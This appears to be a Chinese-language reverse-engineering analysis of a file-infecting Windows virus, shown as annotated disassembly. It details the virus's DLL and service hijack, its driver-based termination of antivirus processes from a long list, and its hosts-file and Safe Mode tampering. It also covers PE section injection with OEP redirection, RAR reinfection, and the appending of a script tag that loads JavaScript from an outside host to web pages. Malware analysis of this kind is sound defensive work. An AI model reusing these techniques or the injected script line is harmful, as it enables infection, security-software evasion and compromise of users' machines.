-.text:00402415                 jz      Next\_2  
-.text:0040241B                 push    \[ebp+lpString\]  
-.text:0040241E                 lea     eax, \[ebp+Buffer\]  
-.text:00402424                 push    eax  
-.text:00402425                 push offset aSSystem32S\_dll ; "%s\\\\system32\\\\%s.dll"  
-.text:0040242A                 lea     eax, \[ebp+FileName\]  
-.text:00402430                 push    eax             ; LPSTR  
-.text:00402431                 call    ds:wsprintfA  
-.text:00402437                 add     esp, 10h  
-.text:0040243A                 lea     eax, \[ebp+FileName\]  
-.text:00402440                 push    eax             ; lpData  
-.text:00402441                 push    \[ebp+lpString\]  ; int  
-.text:00402444                 call    GetDllName      ; 从注册表获取 Dll 名称  
-.text:00402449                 lea     eax, \[ebp+FileName\]  
-.text:0040244F                 push    eax             ; lpFileName  
-.text:00402450                 call    ReplaceDll      ; 替换上面提到的 Dll  
-.text:00402455                 test    eax, eax  
-.text:00402457                 jnz     short ReadReplace ; 替换成功跳走启动服务  
-.text:00402459                 jmp     short Next\_2  
-.text:0040245B                 jmp     short Next\_2  
-.text:0040245D ReadReplace:                            ; CODE XREF: ExeRun+42B j  
-.text:0040245D                 push    0               ; lpServiceArgVectors  
-.text:0040245F                 push    0               ; dwNumServiceArgs  
-.text:00402461                 push    \[ebp+hSCObject\] ; hService  
-.text:00402467                 call    ds:StartServiceA  
-.text:0040246D                 test    eax, eax  
-.text:0040246F                 jnz     short Over\_2    ; 启动你服务成功跳走退出  
-.text:00402471                 jmp     short Next\_2  
-.text:00402473                 jmp     short Next\_2  
-.text:00402475 Over\_2:                 
-.text:00402475                 push    \[ebp+hLibModule\] ; hLibModule  
-.text:0040247B                 call    ds:FreeLibrary  
-.text:00402481                 push    \[ebp+hSCObject\] ; hSCObject  
-.text:00402487                 call    ds:CloseServiceHandle  
-.text:0040248D                 push    \[ebp+hSCManager\] ; hSCObject  
-.text:00402490                 call    ds:CloseServiceHandle  
-.text:00402496                 cmp     dword\_40DC3C, 0  
-.text:0040249D                 jz      short ExitThisProcess\_1  
-.text:0040249F                 mov     eax, dword\_40DC3C  
-.text:004024A4                 mov     \[ebp+var\_C34\], eax  
-.text:004024AA                 push    \[ebp+var\_C34\]   ; void \*  
-.text:004024B0                 call    ??3@YAXPAX@Z    ; operator delete(void \*)  
-.text:004024B5                 pop     ecx  
-.text:004024B6 ExitThisProcess\_1:               
-.text:004024B6                 push    0               ; uExitCode  
-.text:004024B8                 call    ds:ExitProcess  
-.text:004024BE Next\_2:                             ..  
-.text:004024BE                 push    \[ebp+lpString\]  ; lpString  
-.text:004024C1                 call    ds:lstrlenA  
-.text:004024C7                 mov     ecx, \[ebp+lpString\]  
-.text:004024CA                 lea     eax, \[ecx+eax+1\]  
-.text:004024CE                 mov     \[ebp+lpString\], eax  
-.text:004024D1                 jmp     GetNext\_1  
-  
-  
-此时该文件为 exe 的功能就分析结束了，下面是该程序为 dll 时的功能：首先通过 CreateBin 函数内部功能判断当前进程名是不是"booter.exe""CONFIG.exe""boottemp.exe"，如果不是则寻找"avp.exe"和"bdagent.exe"进程，这里是通过枚举进程名比较，故不贴出来了。  
-.text:0040540D                 push    offset aAvp\_exe ; "avp.exe"  
-.text:00405412                 call    CheckProcess  
-.text:00405417                 test    eax, eax  
-.text:00405419                jnz   short GoWriteNop ; 没有找到跳走写入一堆 90，然后删除  
-.text:0040541B                 push    offset aBdagent\_exe ; "bdagent.exe"  
-.text:00405420                 call    CheckProcess    ; 通过枚举进程搜索这两个杀软进程  
-.text:00405425                 test    eax, eax  
-.text:00405427                 jz      short GoRevertData  
-.text:00405429 GoWriteNop:                             ; CODE XREF: MainGN+7C j  
-.text:00405429                 call    WriteNop        ; 写入一堆 90 然后删除  
-  
-  
-接着解压一系列名称如杀软进程名，网络用户名和弱口令，网址名称等，解压完毕后在临时文件夹创建驱动文件"Forter.sys"，代码如下：  
-.text:004054D7                 push    offset TempPath ; lpBuffer  
-.text:004054DC                 push    104h            ; nBufferLength  
-.text:004054E1                 call    ds:GetTempPathA  
-.text:004054E7                 push    104h            ; size\_t  
-.text:004054EC                 push    0               ; int  
-.text:004054EE                 push    offset SystemDirector ; void \*  
-.text:004054F3                 call    memset  
-.text:004054F8                 add     esp, 0Ch  
-.text:004054FB                 push    104h            ; uSize  
-.text:00405500                 push    offset SystemDirector ; lpBuffer  
-.text:00405505                 call    ds:GetSystemDirectoryA  
-.text:0040550B                 push    104h            ; size\_t  
-.text:00405510                 push    0               ; int  
-.text:00405512                 lea     eax, \[ebp+FileName\]  
-.text:00405518                 push    eax             ; void \*  
-.text:00405519                 call    memset  
-.text:0040551E                 add     esp, 0Ch  
-.text:00405521                 push    offset aForter\_sys ; "Forter.sys"  
-.text:00405526                 push    offset TempPath  
-.text:0040552B                 push    offset aSS\_0    ; "%s%s"  
-.text:00405530                 lea     eax, \[ebp+FileName\]  
-.text:00405536                 push    eax  
-.text:00405537                 call    \[ebp+wsprintfA\]  
-.text:0040553A                 add     esp, 10h  
-.text:0040553D                 push    80h             ; int  
-.text:00405542                 push    65h             ; int  
-.text:00405544                 push    hModule         ; hModule  
-.text:0040554A                 lea     eax, \[ebp+FileName\]  
-.text:00405550                 push    eax             ; int  
-.text:00405551                 call    CallLoadResource ; 在临时文件夹下创建"Forter.sys"  
-  
-.text:00405556                 lea     eax, \[ebp+FileName\]  
-.text:0040555C                 push    eax             ; lpBinaryPathName  
-.text:0040555D                 call    StartService\_1  ; 启动"Forter.sys"服务  
-.text:00405562                 push    400h            ; size\_t  
-.text:00405567                 push    0               ; int  
-.text:00405569                 lea     eax, \[ebp+String\]  
-.text:0040556F                 push    eax             ; void \*  
-.text:00405570                 call    memset  
-.text:00405575                 add     esp, 0Ch  
-.text:00405578                 push    offset DisplayName ; "Forter"  
-.text:0040557D                 push    off\_40B548      ; "SYSTEM\\\\CurrentControlSet\\\\Services"  
-.text:00405583                 push    offset aSS      ; "%s\\\\%s"  
-.text:00405588                 lea     eax, \[ebp+String\]  
-.text:0040558E                 push    eax             ; LPSTR  
-.text:0040558F                 call    ds:wsprintfA  
-.text:00405595                 add     esp, 10h  
-.text:00405598                 lea     eax, \[ebp+String\]  
-.text:0040559E                 push    eax  
-.text:0040559F                 push    80000002h  
-.text:004055A4                 call    \[ebp+SHDeleteKeyA\] ; 删除 SYSTEM\\\\CurrentControlSet\\\\Services\\\\Forter  
-.text:004055AA                 lea     eax, \[ebp+FileName\]  
-.text:004055B0                 push    eax             ; lpFileName  
-.text:004055B1                 call    ds:DeleteFileA  ; 删除临时文件夹下的"Forter.sys"文件  
-  
-接下来关闭杀毒软件，杀软进程名：  
-KVMonXP.kxp.KVSrvXP.exe.avp.exe.avp.exe.avp.exe.RavMonD.exe.RavTask.exe.RsAgent.exe.rsnetsvr.exe.RsTray.exe.ScanFrm.exe.CCenter.exe.kavstart.exe.kissvc.exe.kpfw32.exe.kpfwsvc.exe.kswebshield.exe.kwatch.exe.kmailmon.exe.egui.exe.ekrn.exe.ccSvcHst.exe.ccSvcHst.exe.ccSvcHst.exe.Mcagent.exe.mcmscsvc.exe.McNASvc.exe.Mcods.exe.McProxy.exe.Mcshield.exe.  
-mcsysmon.exe.mcvsshld.exe.MpfSrv.exe.McSACore.exe.msksrver.exe.sched.exe.avguard.exe.avmailc.exe.avwebgrd.exe.avgnt.exe.sched.exe.avguard.exe.avcenter.exe.UfSeAgnt.exe.  
-TMBMSRV.exe.SfCtlCom.exe.TmProxy.exe.360SoftMgrSvc.exe.360tray.exe.qutmserv.exe.bdagent.exe.livesrv.exe.seccenter.exe.vsserv.exe.MPSVC.exe.MPSVC1.exe.MPSVC2.exe.  
-MPMon.exe.ast.exe.360speedld.exe.360SoftMgrSvc.exe.360tray.exe.修复工具.exe.  
-360hotfix.exe.360rpt.exe.360safe.exe.360safebox.exe.krnl360svc.exe.zhudongfangyu.exe.360sd.exe.360rp.exe.360se.exe.safeboxTray.exe.  
-下面是关闭杀毒软件的步骤：  
-.text:0040528C           mov   \[ebp+AntiVirsName\], offset AntiVName ; 取第一个杀软名  
-.text:00405293 Next\_2:   
-.text:00405293                 mov     eax, \[ebp+AntiVirsName\]  
-.text:00405296                 movsx   eax, byte ptr \[eax\]  
-.text:00405299                 test    eax, eax  
-.text:0040529B                 jz      Over\_2          ; 局部变量第一字节为 0 退出  
-.text:004052A1                 and     \[ebp+var\_8\], 0  
-.text:004052A5                 jmp     short loc\_4052AE  
-.text:004052A7 Next\_1:                                 ; CODE XREF:   
-.text:004052A7                 mov     eax, \[ebp+var\_8\]  
-.text:004052AA                 inc     eax  
-.text:004052AB                 mov     \[ebp+var\_8\], eax  
-.text:004052AE loc\_4052AE:                             ; CODE XREF:   
-.text:004052AE                 cmp     \[ebp+var\_8\], 4  
-.text:004052B2                 jge     short GoNext  
-.text:004052B4                 mov     \[ebp+var\_C\], 1  
-.text:004052BB                 and     \[ebp+InBuffer\], 0  
-.text:004052BF                 and     \[ebp+BytesReturned\], 0  
-.text:004052C3                 push    \[ebp+AntiVirsName\] ; 杀毒软件名称列表  
-.text:004052C6                 call    CheckProcess    ; 检查上面这个进程是否存在  
-.text:004052CB                 mov     \[ebp+InBuffer\], eax  
-.text:004052CE                 cmp     \[ebp+InBuffer\], 0  
-.text:004052D2                 jnz     short loc\_4052D6 ; 存在向驱动发送 IRP 终止  
-.text:004052D4                 jmp     short GoNext    ; 指定的进程名不存在，取下一个探测  
-.text:004052D6 loc\_4052D6:                             ; CODE XREF:   
-.text:004052D6                 push    0               ; lpOverlapped  
-.text:004052D8                 lea     eax, \[ebp+BytesReturned\]  
-.text:004052DB                 push    eax             ; lpBytesReturned  
-.text:004052DC                 push    0               ; nOutBufferSize  
-.text:004052DE                 push    0               ; lpOutBuffer  
-.text:004052E0                 push    4               ; nInBufferSize  
-.text:004052E2                 lea     eax, \[ebp+InBuffer\]  
-.text:004052E5                 push    eax             ; lpInBuffer  
-.text:004052E6                 push    222264h         ; dwIoControlCode  
-.text:004052EB                 push    \[ebp+hDevice\]   ; hDevice  
-.text:004052EE                 call    ds:DeviceIoControl ; 发送 IRP 吗终止杀毒软件  
-.text:004052F4                 mov     \[ebp+var\_C\], eax  
-.text:004052F7                 cmp     \[ebp+var\_C\], 0  
-.text:004052FB                 jnz     short SucessControl ; 关闭杀软成功，跳走  
-.text:004052FD                 jmp     short GoNext  
-.text:004052FF SucessControl:                          ; CODE XREF:   
-.text:004052FF                 push    32h             ; dwMilliseconds  
-.text:00405301                 call    ds:Sleep  
-.text:00405307                 jmp     short Next\_1  
-.text:00405309 GoNext:                                 ; CODE XREF:   
-.text:00405309                 push    32h             ; dwMilliseconds  
-.text:0040530B                 call    ds:Sleep  
-.text:00405311                 push    \[ebp+AntiVirsName\] ; lpString  
-.text:00405314                 call    ds:lstrlenA  
-.text:0040531A                 mov     ecx, \[ebp+AntiVirsName\]  
-.text:0040531D                 lea     eax, \[ecx+eax+1\]  
-.text:00405321                 mov     \[ebp+AntiVirsName\], eax ; 取下一个杀软名  
-.text:00405324                 jmp     Next\_2  
-  
-劫持 drivers\\\\etc\\\\hosts，屏蔽一系列网址  
-.text:004066DE               mov    \[ebp+lpBuffer\], offset a127\_0\_0\_1Local ; "127.0.0.1       localhost\\r\\n"  
-.text:004066E5                 and     \[ebp+NumberOfBytesWritten\], 0  
-.text:004066E9                 or      \[ebp+hObject\], 0FFFFFFFFh  
-.text:004066ED                 push    104h            ; size\_t  
-.text:004066F2                 push    0               ; int  
-.text:004066F4                 lea     eax, \[ebp+FileName\]  
-.text:004066FA                 push    eax             ; void \*  
-.text:004066FB                 call    memset  
-.text:00406700                 add     esp, 0Ch  
-.text:00406703                 push    offset SystemDirector  
-.text:00406708                 push    offset aSDriversEtcHos ; "%s\\\\drivers\\\\etc\\\\hosts"  
-.text:0040670D                 lea     eax, \[ebp+FileName\]  
-.text:00406713                 push    eax             ; LPSTR  
-.text:00406714                 call    ds:wsprintfA  
-.text:0040671A                 add     esp, 0Ch  
-.text:0040671D                 push    0               ; hTemplateFile  
-.text:0040671F                 push    80h             ; dwFlagsAndAttributes  
-.text:00406724                 push    3               ; dwCreationDisposition  
-.text:00406726                 push    0               ; lpSecurityAttributes  
-.text:00406728                 push    3               ; dwShareMode  
-.text:0040672A                 push    0C0000000h      ; dwDesiredAccess  
-.text:0040672F                 lea     eax, \[ebp+FileName\]  
-.text:00406735                 push    eax             ; lpFileName  
-.text:00406736                 call    ds:CreateFileA  
-.text:0040673C                 mov     \[ebp+hObject\], eax  
-.text:0040673F                 push    0               ; lpOverlapped  
-.text:00406741                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-.text:00406744                 push    eax             ; lpNumberOfBytesWritten  
-.text:00406745                 push    \[ebp+lpBuffer\]  ; lpString  
-.text:00406748                 call    ds:lstrlenA  
-.text:0040674E                 push    eax             ; nNumberOfBytesToWrite  
-.text:0040674F                 push    \[ebp+lpBuffer\]  ; lpBuffer  
-.text:00406752                 push    \[ebp+hObject\]   ; hFile  
-.text:00406755                 call  ds:WriteFile    ; 写入"127.0.0.1       localhost\\r\\n"  
-  
-  
-删除注册表破坏安全模式  
-.text:00406963                 push    offset pszSubKey   
-; "SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBo"...  
-.text:00406968                 push    80000002h       ; hkey  
-.text:0040696D                 call    ds:SHDeleteKeyA  
-.text:00406973                 push    offset aSystemCurren\_0   
-; "SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBo"...  
-.text:00406978                 push    80000002h       ; hkey  
-.text:0040697D                 call    ds:SHDeleteKeyA ; 删除注册表破坏安全模式  
-  
-接下来是感染文件，首先判断"C:\\\\Program Files\\\\WinRAR\\\\Rar.exe"是否存在  
-.text:0040634A                 push    offset aCProgramFilesW ; "C:\\\\Program Files\\\\WinRAR\\\\Rar.exe"  
-.text:0040634F                 push    offset pszPath  ; lpString1  
-.text:00406354                 call    ds:lstrcpyA  
-.text:0040635A                 push    offset pszPath  ; pszPath  
-.text:0040635F                 call    ds:PathFileExistsA  
-.text:00406365                 mov     CRar\_exe, eax  
-  
-然后获取磁盘类型，避免无效分区和光驱，如果遇到无效和光驱则再次跳回接着感染。  
-.text:004063C3                 push    \[ebp+lpString\]  ; lpRootPathName  
-.text:004063C6                 call    ds:GetDriveTypeA ; 获取磁盘类型  
-.text:004063CC                 mov     \[ebp+DriveType\], eax  
-.text:004063CF                 cmp     \[ebp+DriveType\], 1 ; 无效分区 DRIVE\_NO\_ROOT\_DIR  
-.text:004063D3                 jbe     short Next\_2  
-.text:004063D5                 cmp     \[ebp+DriveType\], 5  
-.text:004063D9                 jz      short Next\_2    ; 当是光驱的时候跳走  
-  
-如果磁盘是正常则开辟线程感染文件  
-.text:004063DB                 push    0  
-.text:004063DD                 push    0  
-.text:004063DF                 mov     eax, \[ebp+lpString\]  
-.text:004063E2                 push    dword ptr \[eax\]   ;文件路径做为参数  
-.text:004063E4                 push    offset TaintFile\_1 ; 创建线程感染文件  
-.text:004063E9                 push    0  
-.text:004063EB                 push    0  
-.text:004063ED                 call    \[ebp+CreateThread\]  
-  
-感染文件之前还要检查路径，排除系统文件被感染，跳过 WinRAR，WindowsUpdate，Windows NT，Windows Media Player，Outlook Express，NetMeeting，MSN Gaming Zone，Movie Maker  
-microsoft frontpage，Messenger，Internet Explorer，InstallShield Installation Information  
-ComPlus Applications，Common Files，RECYCLER，System Volume Information  
-Documents and Settings，WinNT，WINDOWS，实现方法如下：  
-.text:00406220 NextSysFlod:   
-.text:00406220                 mov     eax, \[ebp+var\_35C\]  
-.text:00406226                 inc     eax  
-.text:00406227                 mov     \[ebp+var\_35C\], eax  
-.text:0040622D loc\_40622D:      
-.text:0040622D                 cmp     \[ebp+var\_35C\], 15h  
-.text:00406234                 jge     short loc\_40625A  
-.text:00406236                 mov     eax, \[ebp+var\_35C\]  
-.text:0040623C                 push    lpString2\[eax\*4\] ; lpString2  
-.text:00406243                 push    \[ebp+lpString1\] ; lpString1  
-.text:00406249                 call    ds:lstrcmpiA    ; 与指定的系统目录做比较  
-.text:0040624F                 test    eax, eax  
-.text:00406251                 jnz     short Next\_1  
-.text:00406253                 jmp     GoOutReturn     ; 避免感染系统目录内的文件  
-.text:00406253                                         ; 找到系统目录后退出  
-.text:00406258 Next\_1:                             
-.text:00406258                 jmp     short NextSysFlod  
-  
-下面通过 FindFirstFile 和 FindNextFile 搜寻文件，找到后调用感染函数感染之。  
-下面是感染 exe 文件的主要过程，首先创建文件映射，在创建文件映射后修改节区数，映射内存长度，入口点地址，还有新增一个名为.tc 的节区，之后定位到文件末尾，在文件末尾写入 shell 代码以及原 OEP。  
-  
-构造一个新节区：  
-.text:0040727B                 mov     eax, \[ebp+EndOfLastTriv\]  
-.text:00407281                 mov     \[ebp+var\_50\], eax  
-.text:00407284                 mov     \[ebp+var\_40\], 0E0000020h ; 节区属性  
-.text:0040728B                 mov     ax, word ptr byte\_40BE6C  
-.text:00407291                 mov     \[ebp+var\_42\], ax  
-.text:00407295                 push    28h             ; size\_t  
-.text:00407297                 lea     eax, \[ebp+ct.\]  
-.text:0040729A                 push    eax             ; void \*  
-.text:0040729B                 mov     eax, \[ebp+NTAddress\]  
-.text:004072A1                 add     eax, \[ebp+NTSecLen\]  
-.text:004072A4                 push    eax             ; void \*  
-.text:004072A5                 call    memcpy          ; 构造新节头  
-.text:004072AA                 add     esp, 0Ch  
-.text:004072AD                 mov     eax, \[ebp+NTAddress\]  
-.text:004072B3                 movzx   eax, word ptr \[eax+6\]  
-.text:004072B7                 inc     eax             ; 节头数加 1  
-.text:004072B8                 mov     ecx, \[ebp+NTAddress\]  
-.text:004072BE                 mov     \[ecx+6\], ax  
-.text:004072C2                 mov     eax, \[ebp+NTAddress\]  
-.text:004072C8                 cmp     dword ptr \[eax+1Ch\], 0  
-.text:004072CC                 jz      short WriteShellCode ; 跳走写 shell 代码  
-  
-.text:004072E3                 mov     eax, \[ebp+NTAddress\] ; 定位到 NT 头的地址  
-.text:004072E9                 mov     ecx, \[ebp+EndOfShellCode\]  
-.text:004072EC                 mov     \[eax+28h\], ecx  ; 修改入口点地址  
-.text:004072EF                 mov     eax, \[ebp+NTAddress\]  
-.text:004072F5                 mov     eax, \[eax+50h\]  
-.text:004072F8                 add     eax, \[ebp+var\_5C\]  
-.text:004072FB                 mov     ecx, \[ebp+NTAddress\]  
-.text:00407301                 mov     \[ecx+50h\], eax  ; 修改导入表的地址  
-.text:00407304                 push    \[ebp+lpBaseAddress\] ; lpBaseAddress  
-.text:00407307                 call    ds:UnmapViewOfFile  
-  
-.text:0040731E                 push    2               ; dwMoveMethod  
-.text:00407320                 push    0               ; lpDistanceToMoveHigh  
-.text:00407322                 mov     eax, \[ebp+SplcaeEnd\]  
-.text:00407328                 add     eax, \[ebp+var\_54\]  
-.text:0040732B                 push    eax             ; lDistanceToMove  
-.text:0040732C                 push    \[ebp+hFile\]     ; hFile  
-.text:0040732F                 call    ds:SetFilePointer  
-.text:00407335                 push    \[ebp+hFile\]     ; hFile  
-.text:00407338                 call    ds:SetEndOfFile  
-.text:0040733E                 push    2               ; dwMoveMethod  
-.text:00407340                 push    0               ; lpDistanceToMoveHigh  
-.text:00407342                 xor     eax, eax  
-.text:00407344                 sub     eax, \[ebp+var\_54\]  
-.text:00407347                 push    eax             ; lDistanceToMove  
-.text:00407348                 push    \[ebp+hFile\]     ; hFile  
-.text:0040734B                 call    ds:SetFilePointer ; 定位到文件结尾  
-.text:00407351                 push    0               ; lpOverlapped  
-.text:00407353                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-.text:00407356                 push    eax             ; lpNumberOfBytesWritten  
-.text:00407357                 push    297h            ; nNumberOfBytesToWrite  
-.text:0040735C                 push    offset loc\_409BA8 ; lpBuffer  
-.text:00407361                 push    \[ebp+hFile\]     ; hFile  
-.text:00407364                 call    ds:WriteFile    ; 写入感染 exe 的代码  
-.text:0040736A                 push    0               ; lpOverlapped  
-.text:0040736C                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-.text:0040736F                 push    eax             ; lpNumberOfBytesWritten  
-.text:00407370                 push    nNumberOfBytesToWrite  
- ; nNumberOfBytesToWrite  
-.text:00407376                 push    lpBuffer        ; lpBuffer  
-.text:0040737C                 push    \[ebp+hFile\]     ; hFile  
-.text:0040737F                 call    ds:WriteFile  
-.text:00407385                 push    1               ; dwMoveMethod  
-.text:00407387                 push    0               ; lpDistanceToMoveHigh  
-.text:00407389                 xor     eax, eax  
-.text:0040738B                 sub     eax, nNumberOfBytesToWrite  
-.text:00407391                 sub     eax, 2Bh  
-.text:00407394                 push    eax             ; lDistanceToMove  
-.text:00407395                 push    \[ebp+hFile\]     ; hFile  
-.text:00407398                 call    ds:SetFilePointer  
-.text:0040739E                 push    0               ; lpOverlapped  
-.text:004073A0                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-.text:004073A3                 push    eax             ; lpNumberOfBytesWritten  
-.text:004073A4                 push    4               ; nNumberOfBytesToWrite  
-.text:004073A6                 push    offset nNumberOfBytesToWrite ; lpBuffer  
-.text:004073AB                 push    \[ebp+hFile\]     ; hFile  
-.text:004073AE                 call    ds:WriteFile  
-.text:004073B4                 mov     eax, \[ebp+EndOfShellCode\]  
-.text:004073B7                 add     eax, 297h  
-.text:004073BC                 mov     ecx, \[ebp+OEP\]  ; 保存 OEP  
-.text:004073C2                 sub     ecx, eax  
-.text:004073C4                 mov     \[ebp+Buffer\], ecx ; 重定位 OEP  
-.text:004073C7                 push    2               ; dwMoveMethod  
-.text:004073C9                 push    0               ; lpDistanceToMoveHigh  
-.text:004073CB                 xor     eax, eax  
-.text:004073CD                 sub     eax, \[ebp+var\_54\]  
-.text:004073D0                 push    eax             ; lDistanceToMove  
-.text:004073D1                 push    \[ebp+hFile\]     ; hFile  
-.text:004073D4                 call    ds:SetFilePointer  
-.text:004073DA                 push    1               ; dwMoveMethod  
-.text:004073DC                 push    0               ; lpDistanceToMoveHigh  
-.text:004073DE                 push    293h            ; lDistanceToMove  
-.text:004073E3                 push    \[ebp+hFile\]     ; hFile  
-.text:004073E6                 call    ds:SetFilePointer  
-.text:004073EC                 push    0               ; lpOverlapped  
-.text:004073EE                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-.text:004073F1                 push    eax             ; lpNumberOfBytesWritten  
-.text:004073F2                 push    4               ; nNumberOfBytesToWrite  
-.text:004073F4                 lea     eax, \[ebp+Buffer\]  
-.text:004073F7                 push    eax             ; lpBuffer  
-.text:004073F8                 push    \[ebp+hFile\]     ; hFile  
-.text:004073FB                 call    ds:WriteFile    ; 将 OEP 写入被感染的 exe 文件  
-.text:00407401                 push    1               ; int  
-.text:00407403                 lea     eax, \[ebp+CreationTime\]  
-.text:00407409                 push    eax             ; lpCreationTime  
-.text:0040740A                 push    \[ebp+hFile\]     ; hFile  
-.text:0040740D                 call    FileOldTime     ; 将被感染的文件的时间设置成之前的时间  
-  
-对于 html 和 htm，asp，apsl 格式文件则在该文件末尾写上一串<script type=""text/javascript"" src=""http://web.nba1001.net:8888/tj/tongji.js""></script>实现方法如下：  
-.text:00405AA9                 push    0               ; hTemplateFile  
-.text:00405AAB                 push    80h             ; dwFlagsAndAttributes  
-.text:00405AB0                 push    3               ; dwCreationDisposition  
-.text:00405AB2                 push    0               ; lpSecurityAttributes  
-.text:00405AB4                 push    0               ; dwShareMode  
-.text:00405AB6                 push    0C0000000h      ; dwDesiredAccess  
-.text:00405ABB                 push    \[ebp+lpFileName\] ; lpFileName  
-.text:00405ABE                 call    ds:CreateFileA  ; 打开文件句柄  
-.text:00405AC4                 mov     \[ebp+hFile\], eax  
-.text:00405AC7                 cmp     \[ebp+hFile\], 0FFFFFFFFh  
-.text:00405ACB                 jnz     short loc\_405AD6  
-.text:00405ACD                 or      \[ebp+var\_4\], 0FFFFFFFFh  
-.text:00405AD1                 jmp     loc\_405B6A  
-.text:00405AD6 loc\_405AD6:                             ; CODE XREF:   
-.text:00405AD6                 push    0               ; int  
-.text:00405AD8                 lea     eax, \[ebp+CreationTime\]  
-.text:00405ADB                 push    eax             ; lpCreationTime  
-.text:00405ADC                 push    \[ebp+hFile\]     ; hFile  
-.text:00405ADF                 call    FileOldTime     ; 保留文件创建时间  
-.text:00405AE4                 push    offset unk\_40C690 ; lpString1  
-.text:00405AE9                 push    \[ebp+hFile\]     ; hFile  
-.text:00405AEC                 call    ReadMySlef  
-.text:00405AF1                 test    eax, eax  
-.text:00405AF3                 jnz     short loc\_405B04  
-.text:00405AF5                 push    \[ebp+hFile\]     ; hObject  
-.text:00405AF8                 call    ds:CloseHandle  
-.text:00405AFE                 or      \[ebp+var\_4\], 0FFFFFFFFh  
-.text:00405B02                 jmp     short loc\_405B6A  
-.text:00405B04 loc\_405B04:                             ; CODE XREF: TaintThisFile+117 j  
-.text:00405B04                 push    2               ; dwMoveMethod  
-.text:00405B06                 push    0               ; lpDistanceToMoveHigh  
-.text:00405B08                 push    0               ; lDistanceToMove  
-.text:00405B0A                 push    \[ebp+hFile\]     ; hFile  
-.text:00405B0D                 call    ds:SetFilePointer ; 移动文件指针到末尾  
-.text:00405B13                 push    0               ; lpOverlapped  
-.text:00405B15                 lea     eax, \[ebp+NumberOfBytesWritten\]  
-.text:00405B18                 push    eax             ; lpNumberOfBytesWritten  
-.text:00405B19                 push    offset unk\_40C690 ; lpString  
-.text:00405B1E                 call    ds:lstrlenA  
-.text:00405B24                 push    eax             ; nNumberOfBytesToWrite  
-.text:00405B25                 push    offset unk\_40C690 ; lpBuffer  
-.text:00405B2A                 push    \[ebp+hFile\]     ; hFile  
-.text:00405B2D                 call   ds:WriteFile   ; 将感染字符串写入到文件的末尾  
-.text:00405B33                 push    1               ; int  
-.text:00405B35                 lea     eax, \[ebp+CreationTime\]  
-.text:00405B38                 push    eax             ; lpCreationTime  
-.text:00405B39                 push    \[ebp+hFile\]     ; hFile  
-.text:00405B3C                 call    FileOldTime     ; 设置时间到之前  
-.text:00405B41                 push    \[ebp+hFile\]     ; hObject  
-.text:00405B44                 call    ds:CloseHandle  
-  
-如果是 RAR 文件则跳到这里，病毒会调用 C:\\\\Program Files\\\\WinRAR\\\\Rar.exe,并加%s X -ibck \\"%s\\" \\"%s\\\\\\的参数把压缩包中的文件释放到临时目录。然后感染解压出来的的 exe,rar,htm,html,asp,aspx 等文件，感染完毕会调用 rar.exe 加参数%s M -ibck -r -o+ -ep1 \\"%s\\" \\"%s\\\\\*\\把压缩包放回  
-  
-.text:004060D9 TaintRAR:                               ; CODE XREF:   
-.text:004060D9                 push    offset aRar     ; "rar"  
-.text:004060DE                 push    \[ebp+lpString1\] ; lpString1  
-.text:004060E4                 call   ds:lstrcmpiA  ; 如果判断是 rar 则跳到这里来感染  
-.text:004060EA                 test    eax, eax  
-.text:004060EC                 jnz     short GameOver  
-.text:004060EE                 and     \[ebp+hObject\], 0  
-.text:004060F5                 push    0               ; lpThreadId  
-.text:004060F7                 push    0               ; dwCreationFlags  
-.text:004060F9                 lea     eax, \[ebp+Parameter\]  
-.text:004060FF                 push    eax             ; lpParameter  
-.text:00406100                 push    offset TaintRAR ; lpStartAddress  
-.text:00406105                 push    0               ; dwStackSize  
-.text:00406107                 push    0               ; lpThreadAttributes  
-.text:00406109                 call    ds:CreateThread ; 开新线程感染 rar 压缩包  
-  
-.text:0040612D                 push    0FFFFFFFFh      ; dwMilliseconds  
-.text:0040612F                 push    \[ebp+hObject\]   ; hHandle  
-.text:00406135                 call    ds:WaitForSingleObject ; 等待感染 rar 的线程结束  
-  
-下面是感染过程  
-.text:00405C17                 push    0  
-.text:00405C19                 push    80h  
-.text:00405C1E                 push    3  
-.text:00405C20                 push    0  
-.text:00405C22                 push    3  
-.text:00405C24                 push    0C0000000h  
-.text:00405C29                 lea     eax, \[ebp+FileName\]  
-.text:00405C2F                 push    eax  
-.text:00405C30                 call    \[ebp+CreateFileA\] ; 创建文件句柄  
-.text:00405C36                 mov     \[ebp+hFile\], eax  
-.text:00405C3C                 push    0               ; lpFileSizeHigh  
-.text:00405C3E                 push    \[ebp+hFile\]     ; hFile  
-.text:00405C44                 call    ds:GetFileSize  
-.text:00405C4A                 mov     \[ebp+var\_40C\], eax  
-.text:00405C50                 cmp     \[ebp+var\_40C\], 0  
-.text:00405C57                 jz      short GoOutReturn ; 文件长度为 0 跳走退出  
-.text:00405C59                 cmp     \[ebp+var\_40C\], 0FFFFFFFFh  
-.text:00405C60                 jz      short GoOutReturn ; 获取文件长度失败跳走退出  
-.text:00405C62                 cmp     \[ebp+var\_40C\], 0A00000h  
-.text:00405C6C                 ja      short GoOutReturn ; 文件过大退出  
-.text:00405C6E                 cmp     \[ebp+var\_40C\], 2800h  
-.text:00405C78                 jnb     short loc\_405C90  
-  
-.text:00405C9F                 call    FileOldTime     ; 获取该文件源创建时间\\\\   
-.text:00405D84                 push    eax             ; lpStartupInfo  
-.text:00405D85                 push    0               ; lpCurrentDirectory  
-.text:00405D87                 push    0               ; lpEnvironment  
-.text:00405D89                 push    0C000000h       ; dwCreationFlags  
-.text:00405D8E                 push    1               ; bInheritHandles  
-.text:00405D90                 push    0               ; lpThreadAttributes  
-.text:00405D92                 push    0               ; lpProcessAttributes  
-.text:00405D94                 lea     eax, \[ebp+CommandLine\]  
-.text:00405D9A                 push    eax             ; lpCommandLine  
-.text:00405D9B                 push    0               ; lpApplicationName  
-.text:00405D9D                 call    ds:CreateProcessA ; 将 C:\\\\Program Files\\\\WinRAR\\\\Rar.exe,; 并加%s X -ibck \\"%s\\" \\"%s\\\\\\内以命令行参数运行之  
-  
-.text:00405E3B                 call    TaintFile\_0 ; 解压压缩包后感染压缩包内的文件  
-  
-.text:00405EB3                 push    eax             ; lpStartupInfo  
